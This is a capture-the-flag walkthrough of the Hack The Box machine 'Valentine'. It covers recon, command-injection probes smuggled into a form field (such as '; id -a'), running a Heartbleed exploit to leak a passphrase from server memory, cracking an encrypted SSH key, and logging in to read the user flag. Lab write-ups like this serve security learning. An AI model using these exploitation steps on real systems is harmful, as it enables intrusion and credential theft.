# [08 - Valentine](https://app.hackthebox.com/machines/Valentine)

![Valentine.png](Valentine.png)

## description
> 10.10.10.79

## walkthrough

### recon

```
$ nmap -sV -sC -A -Pn -p- valentine.htb
Starting Nmap 7.80 ( https://nmap.org ) at 2022-07-26 16:31 MDT
Nmap scan report for valentine.htb (10.10.10.79)
Host is up (0.064s latency).
Not shown: 65532 closed ports
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 96:4c:51:42:3c:ba:22:49:20:4d:3e:ec:90:cc:fd:0e (DSA)
|   2048 46:bf:1f:cc:92:4f:1d:a0:42:b3:d2:16:a8:58:31:33 (RSA)
|_  256 e6:2b:25:19:cb:7e:54:cb:0a:b9:ac:16:98:c6:7d:a9 (ECDSA)
80/tcp  open  http    Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/ssl Apache httpd (SSL-only mode)
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US
| Not valid before: 2018-02-06T00:45:25
|_Not valid after:  2019-02-06T00:45:25
|_ssl-date: 2022-07-26T22:31:59+00:00; 0s from scanner time.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

22, 80, 443

443 cert is not valid any more, but was when the box was initially released.

### 80

single img

![omg.jpg](omg.jpg)

headers indicate
> X-Powered-By: PHP/5.3.10-1ubuntu3.26

gobuster with common gives us
```
/.hta                 (Status: 403) [Size: 285]
/.htaccess            (Status: 403) [Size: 290]
/.htpasswd            (Status: 403) [Size: 290]
/cgi-bin/             (Status: 403) [Size: 289]
/decode               (Status: 200) [Size: 552]
/dev                  (Status: 200) [Size: 1099]
/encode               (Status: 200) [Size: 554]
/index                (Status: 200) [Size: 38]
/index.php            (Status: 200) [Size: 38]
/server-status        (Status: 403) [Size: 294]
```

`/encode`, `/decode` and `/dev` are likely interesting


`/dev` gives us
  * [hype_key](hype_key)
  * [notes.txt](notes.txt)


```
$ cat notes.txt
To do:

1) Coffee.
2) Research.
3) Fix decoder/encoder before going live.
4) Make sure encoding/decoding is only done client-side.
5) Don't use the decoder/encoder until any of this is done.
6) Find a better way to take notes.
```

```
$ cat hype_key
2d 2d 2d 2d 2d 42 45 47 49 4e 20 52 53 41 20 50 52 49 56 41 54 45 20 4b 45 59 2d 2d 2d 2d 2d 0d 0a 50 72 6f 63 2d 54 79 70 65 3a 20 34 2c 45 4e 43 52 59 50 54 45 44 0d 0a 44 45 4b 2d 49 6e 66 6f 3a 20 41 45 53 2d 31 32 38 2d 43 42 43 2c 41 45 42 38 38 43 31 34 30 46 36 39 42 46 32 30 37 34 37 38 38 44 45 32 34 41 45 34 38 44 34 36 0d 0a 0d 0a 44 62 50 72 4f 37 38 6b 65 67 4e 75 6b 31 44 41 71 6c 41 4e 35 6a 62 6a 58 76 30 50 50 73 6f 67 33 6a 64 62 4d 46 53 38 69 45 39 70 33 55 4f 4c 30 6c 46 30 78 66 37 50 7a 6d 72 6b 44 61 38 52 0d 0a 35 79 2f 62 34 36 2b 39 6e 45 70 43 4d 66 54 50 68 4e 75 4a 52 63 57 32 55 32 67 4a 63 4f 46 48 2b 39 52 4a 44 42 43 35 55 4a 4d 55 53 31 2f 67 6a 42 2f 37 2f 4d 79 30 30 4d 77 78 2b 61 49 36 0d 0a 30 45 49 30 53 62 4f 59 55 41 56 31 57 34 45 56 37 6d 39 36 51 73 5a 6a 72 77 4a 76 6e 6a 56 61 66 6d 36 56 73 4b 61 54 50 42 48 70 75 67 63 41 53 76 4d 71 7a 37 36 57 36 61 62 52 5a 65 58 69 0d 0a 45 62 77 36 36 68 6a 46 6d 41 75 34 41 7a 71 63 4d 2f 6b 69 67 4e 52 46 50 59 75 4e 69 58 72 58 73 31 77 2f 64 65 4c 43 71 43 4a 2b 45 61 31 54 38 7a 6c 61 73 36 66 63 6d 68 4d 38 41 2b 38 50 0d 0a 4f 58 42 4b 4e 65 36 6c 31 37 68 4b 61 54 36 77 46 6e 70 35 65 58 4f 61 55 49 48 76 48 6e 76 4f 36 53 63 48 56 57 52 72 5a 37 30 66 63 70 63 70 69 6d 4c 31 77 31 33 54 67 64 64 32 41 69 47 64 0d 0a 70 48 4c 4a 70 59 55 49 49 35 50 75 4f 36 78 2b 4c 53 38 6e 31 72 2f 47 57 4d 71 53 4f 45 69 6d 4e 52 44 31 6a 2f 35 39 2f 34 75 33 52 4f 72 54 43 4b 65 6f 39 44 73 54 52 71 73 32 6b 31 53 48 0d 0a 51 64 57 77 46 77 61 58 62 59 79 54 31 75 78 41 4d 53 6c 35 48 71 39 4f 44 35 48 4a 38 47 30 52 36 4a 49 35 52 76 43 4e 55 51 6a 77 78 30 46 49 54 6a 6a 4d 6a 6e 4c 49 70 78 6a 76 66 71 2b 45 0d 0a 70 30 67 44 30 55 63 79 6c 4b 6d 36 72 43 5a 71 61 63 77 6e 53 64 64 48 57 38 57 33 4c 78 4a 6d 43 78 64 78 57 35 6c 74 35 64 50 6a 41 6b 42 59 52 55 6e 6c 39 31 45 53 43 69 44 34 5a 2b 75 43 0d 0a 4f 6c 36 6a 4c 46 44 32 6b 61 4f 4c 66 75 79 65 65 30 66 59 43 62 37 47 54 71 4f 65 37 45 6d 4d 42 33 66 47 49 77 53 64 57 38 4f 43 38 4e 57 54 6b 77 70 6a 63 30 45 4c 62 6c 55 61 36 75 6c 4f 0d 0a 74 39 67 72 53 6f 73 52 54 43 73 5a 64 31 34 4f 50 74 73 34 62 4c 73 70 4b 78 4d 4d 4f 73 67 6e 4b 6c 6f 58 76 6e 6c 50 4f 53 77 53 70 57 79 39 57 70 36 79 38 58 58 38 2b 46 34 30 72 78 6c 35 0d 0a 58 71 68 44 55 42 68 79 6b 31 43 33 59 50 4f 69 44 75 50 4f 6e 4d 58 61 49 70 65 31 64 67 62 30 4e 64 44 31 4d 39 5a 51 53 4e 55 4c 77 31 44 48 43 47 50 50 34 4a 53 53 78 58 37 42 57 64 44 4b 0d 0a 61 41 6e 57 4a 76 46 67 6c 41 34 6f 46 42 42 56 41 38 75 41 50 4d 66 56 32 58 46 51 6e 6a 77 55 54 35 62 50 4c 43 36 35 74 46 73 74 6f 52 74 54 5a 31 75 53 72 75 61 69 32 37 6b 78 54 6e 4c 51 0d 0a 2b 77 51 38 37 6c 4d 61 64 64 73 31 47 51 4e 65 47 73 4b 53 66 38 52 2f 72 73 52 4b 65 65 4b 63 69 6c 44 65 50 43 6a 65 61 4c 71 74 71 78 6e 68 4e 6f 46 74 67 30 4d 78 74 36 72 32 67 62 31 45 0d 0a 41 6c 6f 51 36 6a 67 35 54 62 6a 35 4a 37 71 75 59 58 5a 50 79 6c 42 6c 6a 4e 70 39 47 56 70 69 6e 50 63 33 4b 70 48 74 74 76 67 62 70 74 66 69 57 45 45 73 5a 59 6e 35 79 5a 50 68 55 72 39 51 0d 0a 72 30 38 70 6b 4f 78 41 72 58 45 32 64 6a 37 65 58 2b 62 71 36 35 36 33 35 4f 4a 36 54 71 48 62 41 6c 54 51 31 52 73 39 50 75 6c 72 53 37 4b 34 53 4c 58 37 6e 59 38 39 2f 52 5a 35 6f 53 51 65 0d 0a 32 56 57 52 79 54 5a 31 46 66 6e 67 4a 53 73 76 39 2b 4d 66 76 7a 33 34 31 6c 62 7a 4f 49 57 6d 6b 37 57 66 45 63 57 63 48 63 31 36 6e 39 56 30 49 62 53 4e 41 4c 6e 6a 54 68 76 45 63 50 6b 79 0d 0a 65 31 42 73 66 53 62 73 66 39 46 67 75 55 5a 6b 67 48 41 6e 6e 66 52 4b 6b 47 56 47 31 4f 56 79 75 77 63 2f 4c 56 6a 6d 62 68 5a 7a 4b 77 4c 68 61 5a 52 4e 64 38 48 45 4d 38 36 66 4e 6f 6a 50 0d 0a 30 39 6e 56 6a 54 61 59 74 57 55 58 6b 30 53 69 31 57 30 32 77 62 75 31 4e 7a 4c 2b 31 54 67 39 49 70 4e 79 49 53 46 43 46 59 6a 53 71 69 79 47 2b 57 55 37 49 77 4b 33 59 55 35 6b 70 33 43 43 0d 0a 64 59 53 63 7a 36 33 51 32 70 51 61 66 78 66 53 62 75 76 34 43 4d 6e 4e 70 64 69 72 56 4b 45 6f 35 6e 52 52 66 4b 2f 69 61 4c 33 58 31 52 33 44 78 56 38 65 53 59 46 4b 46 4c 36 70 71 70 75 58 0d 0a 63 59 35 59 5a 4a 47 41 70 2b 4a 78 73 6e 49 51 39 43 46 79 78 49 74 39 32 66 72 58 7a 6e 73 6a 68 6c 59 61 38 73 76 62 56 4e 4e 66 6b 2f 39 66 79 58 36 6f 70 32 34 72 4c 32 44 79 45 53 70 59 0d 0a 70 6e 73 75 6b 42 43 46 42 6b 5a 48 57 4e 4e 79 65 4e 37 62 35 47 68 54 56 43 6f 64 48 68 7a 48 56 46 65 68 54 75 42 72 70 2b 56 75 50 71 61 71 44 76 4d 43 56 65 31 44 5a 43 62 34 4d 6a 41 6a 0d 0a 4d 73 6c 66 2b 39 78 4b 2b 54 58 45 4c 33 69 63 6d 49 4f 42 52 64 50 79 77 36 65 2f 4a 6c 51 6c 56 52 6c 6d 53 68 46 70 49 38 65 62 2f 38 56 73 54 79 4a 53 65 2b 62 38 35 33 7a 75 56 32 71 4c 0d 0a 73 75 4c 61 42 4d 78 59 4b 6d 33 2b 7a 45 44 49 44 76 65 4b 50 4e 61 61 57 5a 67 45 63 71 78 79 6c 43 43 2f 77 55 79 55 58 6c 4d 4a 35 30 4e 77 36 4a 4e 56 4d 4d 38 4c 65 43 69 69 33 4f 45 57 0d 0a 6c 30 6c 6e 39 4c 31 62 2f 4e 58 70 48 6a 47 61 38 57 48 48 54 6a 6f 49 69 6c 42 35 71 4e 55 79 79 77 53 65 54 42 46 32 61 77 52 6c 58 48 39 42 72 6b 5a 47 34 46 63 34 67 64 6d 57 2f 49 7a 54 0d 0a 52 55 67 5a 6b 62 4d 51 5a 4e 49 49 66 7a 6a 31 51 75 69 6c 52 56 42 6d 2f 46 37 36 59 2f 59 4d 72 6d 6e 4d 39 6b 2f 31 78 53 47 49 73 6b 77 43 55 51 2b 39 35 43 47 48 4a 45 38 4d 6b 68 44 33 0d 0a 2d 2d 2d 2d 2d 45 4e 44 20 52 53 41 20 50 52 49 56 41 54 45 20 4b 45 59 2d 2d 2d 2d 2d
```


`/encode`
> Secure Data Encoder - No Data is Stored On Our Servers

except given notes.txt, that doesn't seem true

```
POST /encode/ HTTP/1.1
Host: valentine.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:101.0) Gecko/20100101 Firefox/101.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 14
Origin: http://valentine.htb
Connection: close
Referer: http://valentine.htb/encode/
Upgrade-Insecure-Requests: 1

text=foobarbaz
```

returns

```
HTTP/1.1 200 OK
Date: Wed, 27 Jul 2022 01:11:35 GMT
Server: Apache/2.2.22 (Ubuntu)
X-Powered-By: PHP/5.3.10-1ubuntu3.26
Vary: Accept-Encoding
Content-Length: 67
Connection: close
Content-Type: text/html

Your input: <br>foobarbaz <br>Your encoded input: <br>Zm9vYmFyYmF6
```

which..

```
$ echo Zm9vYmFyYmF6 | base64 -d
foobarbaz
```

is encoding, and not encryption.. so what's the key for?

however - `/encode/` and `/decode` aren't what is linked

  * http://valentine.htb/decode/encode.php
  * http://valentine.htb/encode/decode.php

### `hype_key`

all chars appear to be hex in the alpha range

```
$ cat foo.rb
#!/bin/env ruby

input    = './hype_key'
contents = File.read(input)
tokens   = contents.split(/\s/)

plain = tokens.collect { |t| t.to_i(16).chr }

output = 'hype_key_decoded'
File.open(output, 'w') do |f|
  f.print(plain.join(''))
end
$ ruby foo.rb
$ file hype_key_decoded
hype_key_decoded: PEM RSA private key
```

header is `Proc-Type: 4,ENCRYPTED`, so john

```
$ ~/git/JohnTheRipper/run/ssh2john.py hype_key_decoded > hype_key_hash
$ john_rockyou hype_key_hash
Warning: detected hash type "SSH", but the string is also recognized as "ssh-opencl"
Use the "--format=ssh-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:14 91.69% (ETA: 08:32:59) 0g/s 942693p/s 942693c/s 942693C/s 149467m..1493685
0g 0:00:00:16 DONE (2022-07-27 08:33) 0g/s 894120p/s 894120c/s 894120C/s  0 0 0..clarus
Session completed.

real    0m19.012s
user    4m12.048s
sys     0m1.676s
```

unexpected - but we also don't know a username, so more recon is necessary

### decode

```
POST /decode/ HTTP/1.1
...
text=foo+%26%26+id+-a
```

led to

```
Your input:

foo && id -a

Your encoded input:

~Š"u
```

so definitely not sanitizing input well enough. `||` doesn't see the same

and actually it's not based on the attempts at injection, any non-b64 encoded string passed to the decoder yields the same

POSTing `/decode/encode.php` with `text=%3B+id+-a` gives

```
Your input:

; id -a

Your encoded input:

‰Ö
```

`text=foobarbaz%3B+id+-a` to `/decode` gives
```
Your input:

foobarbaz; id -a

Your encoded input:

~Šj¶ÚÎ'Z
```

```
irb(main):001:0> 'Ö'.ord   #=> 214
irb(main):003:0> "~Šj¶ÚÎ'Z".split('').collect { |c| c.ord }  #=> [126, 352, 106, 182, 218, 206, 39, 90]
```

how are we getting to `214` from
```
irb(main):004:0> '; id -a'.split('').collect { |c| c.ord }    #=> [59, 32, 105, 100, 32, 45, 97]
```

### 1+1 = 2

was not making any forward progress, looking at tags on the page, `CVE-2014-0160`.. heartbleed. and now the box name makes sense.

```
msf6 auxiliary(scanner/ssl/openssl_heartbleed) > run

[+] 10.10.10.79:443       - Heartbeat response with leak, 65535 bytes
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

nice, that's enough to leak.. anything we want

but struggling to find a proper exploit.. and since this is an 'easy' box, we're missing something.


```
$ python heartbleed-exploit.py valentine.htb
Connecting...
Sending Client Hello...
 ... received message: type = 22, ver = 0302, length = 66
 ... received message: type = 22, ver = 0302, length = 885
 ... received message: type = 22, ver = 0302, length = 331
 ... received message: type = 22, ver = 0302, length = 4
Handshake done...
Sending heartbeat request with length 4 :
 ... received message: type = 24, ver = 0302, length = 16384
Received heartbeat response in file out.txt
WARNING : server returned more data than it should - server is vulnerable!

$ cat out.txt
  0000: 02 40 00 D8 03 02 53 43 5B 90 9D 9B 72 0B BC 0C  .@....SC[...r...
  0010: BC 2B 92 A8 48 97 CF BD 39 04 CC 16 0A 85 03 90  .+..H...9.......
  0020: 9F 77 04 33 D4 DE 00 00 66 C0 14 C0 0A C0 22 C0  .w.3....f.....".
  0030: 21 00 39 00 38 00 88 00 87 C0 0F C0 05 00 35 00  !.9.8.........5.
  0040: 84 C0 12 C0 08 C0 1C C0 1B 00 16 00 13 C0 0D C0  ................
  0050: 03 00 0A C0 13 C0 09 C0 1F C0 1E 00 33 00 32 00  ............3.2.
  0060: 9A 00 99 00 45 00 44 C0 0E C0 04 00 2F 00 96 00  ....E.D...../...
  0070: 41 C0 11 C0 07 C0 0C C0 02 00 05 00 04 00 15 00  A...............
  0080: 12 00 09 00 14 00 11 00 08 00 06 00 03 00 FF 01  ................
  0090: 00 00 49 00 0B 00 04 03 00 01 02 00 0A 00 34 00  ..I...........4.
  00a0: 32 00 0E 00 0D 00 19 00 0B 00 0C 00 18 00 09 00  2...............
  00b0: 0A 00 16 00 17 00 08 00 06 00 07 00 14 00 15 00  ................
  00c0: 04 00 05 00 12 00 13 00 01 00 02 00 03 00 0F 00  ................
  00d0: 10 00 11 00 23 00 00 00 0F 00 01 01 30 2E 30 2E  ....#.......0.0.
  00e0: 31 2F 64 65 63 6F 64 65 2E 70 68 70 0D 0A 43 6F  1/decode.php..Co
  00f0: 6E 74 65 6E 74 2D 54 79 70 65 3A 20 61 70 70 6C  ntent-Type: appl
  0100: 69 63 61 74 69 6F 6E 2F 78 2D 77 77 77 2D 66 6F  ication/x-www-fo
  0110: 72 6D 2D 75 72 6C 65 6E 63 6F 64 65 64 0D 0A 43  rm-urlencoded..C
  0120: 6F 6E 74 65 6E 74 2D 4C 65 6E 67 74 68 3A 20 34  ontent-Length: 4
  0130: 32 0D 0A 0D 0A 24 74 65 78 74 3D 61 47 56 68 63  2....$text=aGVhc
  0140: 6E 52 69 62 47 56 6C 5A 47 4A 6C 62 47 6C 6C 64  nRibGVlZGJlbGlld
  0150: 6D 56 30 61 47 56 6F 65 58 42 6C 43 67 3D 3D 7E  mV0aGVoeXBlCg==~
  0160: 2D 49 30 CA 4D 0C A6 00 C3 BB 74 6D 8A 54 54 8A  -I0.M.....tm.TT.
  0170: 2B 98 71 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C  +.q.............
  0180: 66 69 65 64 2D 53 69 6E 63 65 3A 20 53 61 74 2C  fied-Since: Sat,
  0190: 20 32 30 20 4E 6F 76 20 32 30 30 34 20 32 30 3A   20 Nov 2004 20:
  01a0: 31 36 3A 32 34 20 47 4D 54 0D 0A 49 66 2D 4E 6F  16:24 GMT..If-No
  01b0: 6E 65 2D 4D 61 74 63 68 3A 20 22 38 32 36 37 31  ne-Match: "82671
  01c0: 2D 66 35 2D 33 65 39 35 36 34 63 32 33 62 36 30  -f5-3e9564c23b60
  01d0: 30 22 0D 0A 43 61 63 68 65 2D 43 6F 6E 74 72 6F  0"..Cache-Contro
  01e0: 6C 3A 20 6D 61 78 2D 61 67 65 3D 30 0D 0A 0D 0A  l: max-age=0....
  01f0: 3C AF E9 A7 7D D8 F7 4E B9 C7 6F 5B 65 F0 95 06  <...}..N..o[e...
  0200: E1 3E 12 C3 F5 57 36 13 8E 1D 1A FA 82 A0 03 16  .>...W6.........
  0210: C9 75 AB 97 00 2B 00 09 08 03 04 03 03 03 02 03  .u...+..........
  0220: 01 00 0D 00 18 00 16 04 03 05 03 06 03 08 04 08  ................
  0230: 05 08 06 04 01 05 01 06 01 02 03 02 01 00 2D 00  ..............-.
  0240: 02 01 01 00 1C 00 02 40 01 00 00 00 00 00 00 00  .......@........

```

`$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==`

that doesn't look like any string we've sent in..

```
$ echo aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg== | base64 -d
heartbleedbelievethehype
```

and indeed it is not. ssh password? maybe, but still need a username

```
$ john --wordlist=./foo.wl hype_key_hash
Warning: detected hash type "SSH", but the string is also recognized as "ssh-opencl"
Use the "--format=ssh-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: Only 1 candidate left, minimum 16 needed for performance.
heartbleedbelievethehype (hype_key_decoded)
1g 0:00:00:00 DONE (2022-07-27 15:37) 25.00g/s 25.00p/s 25.00c/s 25.00C/s heartbleedbelievethehype
Use the "--show" option to display all of the cracked passwords reliably
Session completed.

real    0m3.071s
user    0m29.137s
sys     0m0.124s
```

also, not ssh password - but password to the ssh key we have.

tried `omg` as the username, no love

running the heartbleed poc multiple times does give us slightly different data

[poc-runner.rb](poc-runner.rb) so don't have to keep moving `out.txt` out of the way

while waiting for that, trying to guess the username
  * cupid
  * valentine
  * rome
  * saint
  * heart

and..

`hype` is the username - it's in the password and it's the prefix on the filename that is the key.

```
$ ssh -l hype -i hype_key_decoded valentine.htb
Warning: Permanently added 'valentine.htb,10.10.10.79' (ECDSA) to the list of known hosts.
Enter passphrase for key 'hype_key_decoded':
Welcome to Ubuntu 12.04 LTS (GNU/Linux 3.2.0-23-generic x86_64)

 * Documentation:  https://help.ubuntu.com/

New release '14.04.5 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Fri Feb 16 14:50:29 2018 from 10.10.14.3
hype@Valentine:~$
```

nice.

```
hype@Valentine:~$ ls -la
total 144
drwxr-xr-x 21 hype hype  4096 Feb  5  2018 .
drwxr-xr-x  3 root root  4096 Dec 11  2017 ..
-rw-------  1 hype hype   131 Feb 16  2018 .bash_history
-rw-r--r--  1 hype hype   220 Dec 11  2017 .bash_logout
-rw-r--r--  1 hype hype  3486 Dec 11  2017 .bashrc
drwx------ 11 hype hype  4096 Dec 11  2017 .cache
drwx------  9 hype hype  4096 Dec 11  2017 .config
drwx------  3 hype hype  4096 Dec 11  2017 .dbus
drwxr-xr-x  2 hype hype  4096 Dec 13  2017 Desktop
-rw-r--r--  1 hype hype    26 Dec 11  2017 .dmrc
drwxr-xr-x  2 hype hype  4096 Dec 11  2017 Documents
drwxr-xr-x  2 hype hype  4096 Dec 11  2017 Downloads
drwxr-xr-x  2 hype hype  4096 Dec 11  2017 .fontconfig
drwx------  3 hype hype  4096 Dec 11  2017 .gconf
drwx------  4 hype hype  4096 Dec 11  2017 .gnome2
-rw-rw-r--  1 hype hype   132 Dec 11  2017 .gtk-bookmarks
drwx------  2 hype hype  4096 Dec 11  2017 .gvfs
-rw-------  1 hype hype   636 Dec 11  2017 .ICEauthority
drwxr-xr-x  3 hype hype  4096 Dec 11  2017 .local
drwx------  3 hype hype  4096 Dec 11  2017 .mission-control
drwxr-xr-x  2 hype hype  4096 Dec 11  2017 Music
drwxr-xr-x  2 hype hype  4096 Dec 11  2017 Pictures
-rw-r--r--  1 hype hype   675 Dec 11  2017 .profile
drwxr-xr-x  2 hype hype  4096 Dec 11  2017 Public
drwx------  2 hype hype  4096 Dec 11  2017 .pulse
-rw-------  1 hype hype   256 Dec 11  2017 .pulse-cookie
drwx------  2 hype hype  4096 Dec 13  2017 .ssh
drwxr-xr-x  2 hype hype  4096 Dec 11  2017 Templates
-rw-r--r--  1 root root    39 Dec 13  2017 .tmux.conf
drwxr-xr-x  2 hype hype  4096 Dec 11  2017 Videos
-rw-------  1 hype hype     0 Dec 11  2017 .Xauthority
-rw-------  1 hype hype 12173 Dec 11  2017 .xsession-errors
-rw-------  1 hype hype  9659 Dec 11  2017 .xsession-errors.old
hype@Valentine:~$ ls Documents/
hype@Valentine:~$ cat .tmux.conf
run-shell ~/.clone/path/resurrect.tmux
hype@Valentine:~$ ls -la .ssh/
total 24
drwx------  2 hype hype 4096 Dec 13  2017 .
drwxr-xr-x 21 hype hype 4096 Feb  5  2018 ..
-rw-------  1 hype hype  397 Dec 13  2017 authorized_keys
-rw-------  1 hype hype 1766 Dec 13  2017 id_rsa
-rw-r--r--  1 hype hype  397 Dec 13  2017 id_rsa.pub
-rw-------  1 hype hype  222 Dec 13  2017 known_hosts
hype@Valentine:~$ cat .ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDUU3iZcDCfeCCIML834Fx2YQF/TIyXoi6VI6S/1Z9SsZM9NShwUdRr3mPJocWOZ7RzuEbpRFZL1zgkykHfn8pR0Wc6kjQw4lCVGV237iqWlG+MSGRVOPuDS1UmaN3dN6bLL541LNpTscE4RbNzPhP6pD
5pKsSX7IcMsAfyZ9rpfZKuciS0LXpbTS6kokrru6/MM1u3DkcfxuSW8HeO6lWQ7sbCMLbCp9WjKmBRlxMY4Jj0tUsz8f66vGaHxWiaUzBFy5m82qfCyL9N4Yro1xe1RF8uC58i8rE/baDzW2GMK7JVcAvPiunu2J0QeWg8sVOytLLxPVxPrPKDb7CBEkzN
 hype@hemorrhage
hype@Valentine:~$ find . -iname user.txt
./Desktop/user.txt
hype@Valentine:~$ cat Desktop/user.txt
e6710a5464769fd5fcd216e076961750
```

user down

## flag

```
user:
root:
```
